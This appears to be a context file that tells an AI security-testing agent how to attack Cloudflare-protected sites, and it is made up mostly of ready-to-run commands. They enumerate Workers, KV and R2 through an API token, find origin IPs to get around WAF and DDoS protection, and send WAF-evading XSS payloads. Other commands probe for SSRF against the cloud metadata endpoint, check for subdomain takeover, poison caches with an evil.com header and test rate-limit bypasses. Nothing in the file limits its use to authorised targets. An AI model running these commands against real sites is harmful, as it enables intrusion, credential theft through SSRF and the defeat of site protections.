# Cloudflare Security Testing Context

The `wrangler` CLI is available. Use it for Workers inspection and zone configuration auditing alongside standard HTTP-based testing.

## Identifying Cloudflare-Protected Targets

```bash
# Fingerprint Cloudflare
curl -sI https://TARGET | grep -iE 'cf-ray|cf-cache|server.*cloudflare|cf-request-id'
```

Key indicators:
- **Headers:** `cf-ray`, `cf-cache-status`, `server: cloudflare`
- **DNS:** Proxied records return Cloudflare IPs (AS13335)
- **Error pages:** Cloudflare-branded errors (1000, 1020 series)
- **Cookies:** `__cf_bm`, `cf_clearance` = bot management active

## Wrangler CLI Reconnaissance

### Workers Inspection

```bash
# List Workers scripts
wrangler deployments list

# Get Worker details
wrangler tail WORKER_NAME  # Stream real-time logs

# List KV namespaces (may contain sensitive data)
wrangler kv namespace list

# List keys in a KV namespace
wrangler kv key list --namespace-id NAMESPACE_ID

# List R2 buckets
wrangler r2 bucket list

# List D1 databases
wrangler d1 list
```

### Using the Cloudflare REST API Directly

If `CLOUDFLARE_API_TOKEN` is set, query the API for deeper inspection:

```bash
# List zones
curl -sH "Authorization: Bearer $CLOUDFLARE_API_TOKEN" \
  "https://api.cloudflare.com/client/v4/zones" | \
  python3 -c "import sys,json; [print(f\"{z['name']} ({z['id']}) plan={z['plan']['name']} status={z['status']}\") for z in json.load(sys.stdin)['result']]"

# Get DNS records — find non-proxied records that leak origin IPs
curl -sH "Authorization: Bearer $CLOUDFLARE_API_TOKEN" \
  "https://api.cloudflare.com/client/v4/zones/ZONE_ID/dns_records?per_page=100" | \
  python3 -c "
import sys, json
for r in json.load(sys.stdin)['result']:
    proxy = 'PROXIED' if r.get('proxied') else 'DNS-ONLY'
    print(f\"{r['type']:6s} {r['name']:40s} {r['content']:20s} {proxy}\")
"

# Get WAF/firewall rules
curl -sH "Authorization: Bearer $CLOUDFLARE_API_TOKEN" \
  "https://api.cloudflare.com/client/v4/zones/ZONE_ID/firewall/rules" | python3 -m json.tool

# Get security settings
curl -sH "Authorization: Bearer $CLOUDFLARE_API_TOKEN" \
  "https://api.cloudflare.com/client/v4/zones/ZONE_ID/settings" | \
  python3 -c "import sys,json; [print(f\"{s['id']:30s} = {s['value']}\") for s in json.load(sys.stdin)['result']]"
```

## Common Attack Vectors

### Origin IP Discovery
Cloudflare hides the real origin server. Finding it allows bypassing all WAF/DDoS protections.

```bash
# Check non-proxied subdomains
for sub in mail ftp cpanel direct origin staging dev api ssh vpn mx smtp imap pop3 webmail; do
  ip=$(dig +short ${sub}.TARGET 2>/dev/null)
  [ -n "$ip" ] && echo "${sub}.TARGET -> ${ip}"
done

# Check MX records (mail servers often on the same IP)
dig +short MX TARGET
dig +short A $(dig +short MX TARGET | awk '{print $2}' | head -1)

# Check TXT/SPF records for origin IPs
dig +short TXT TARGET | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
```

Once origin IP is found:
```bash
# Bypass Cloudflare — access origin directly
curl -sk -H "Host: TARGET" "https://ORIGIN_IP/"
```

### WAF Bypass Techniques

```bash
# Content-Type manipulation
curl -s -X POST "https://TARGET/api" -H "Content-Type: text/plain" -d '{"q":"<script>alert(1)</script>"}'

# Double URL encoding
curl -s "https://TARGET/?q=%253Cscript%253Ealert(1)%253C%252Fscript%253E"

# Unicode normalization bypass
curl -s "https://TARGET/?q=＜script＞alert(1)＜/script＞"

# Case variation
curl -s "https://TARGET/?q=<ScRiPt>alert(1)</sCrIpT>"

# HTTP method override
curl -s -X GET "https://TARGET/admin" -H "X-HTTP-Method-Override: DELETE"

# WAF test (check if WAF is active)
code=$(curl -s -o /dev/null -w "%{http_code}" "https://TARGET/?test=<script>alert(1)</script>")
echo "XSS probe response: ${code} (403 = WAF active)"
```

### Cloudflare Workers Security
Workers run at the edge and may contain hardcoded secrets, auth logic flaws, or SSRF via `fetch()`.

```bash
# Test worker routes
curl -sI "https://TARGET/_cf/workers/"

# Test endpoints that proxy/fetch external resources for SSRF
curl -s "https://TARGET/proxy?url=http://169.254.169.254/latest/meta-data/"

# Check error responses for information disclosure
curl -s "https://TARGET/nonexistent-worker-route" -H "Accept: application/json"
```

### DNS Misconfigurations

```bash
# Subdomain takeover — dangling CNAMEs
for sub in blog docs status app cdn api; do
  cname=$(dig +short CNAME ${sub}.TARGET)
  if [ -n "$cname" ]; then
    echo "${sub}.TARGET -> ${cname}"
    curl -sI "https://${sub}.TARGET" | head -5
  fi
done

# Wildcard DNS check
dig +short A random-nonexistent-sub.TARGET
```

### Cache Poisoning

```bash
# Test unkeyed headers
for header in X-Forwarded-Host X-Original-URL X-Rewrite-URL X-Forwarded-Scheme; do
  curl -sI "https://TARGET/" -H "${header}: evil.com" | grep -iE 'cf-cache|x-cache|location'
done

# Web cache deception
curl -s "https://TARGET/account.css"
curl -s "https://TARGET/api/user/settings.js"
```

### Rate Limiting Bypass

```bash
# Test rate limiting per method
for method in GET POST PUT PATCH DELETE OPTIONS; do
  echo -n "${method}: "
  for i in $(seq 1 20); do
    code=$(curl -s -o /dev/null -w "%{http_code}" -X $method "https://TARGET/api/endpoint")
    echo -n "${code} "
  done
  echo ""
done
```
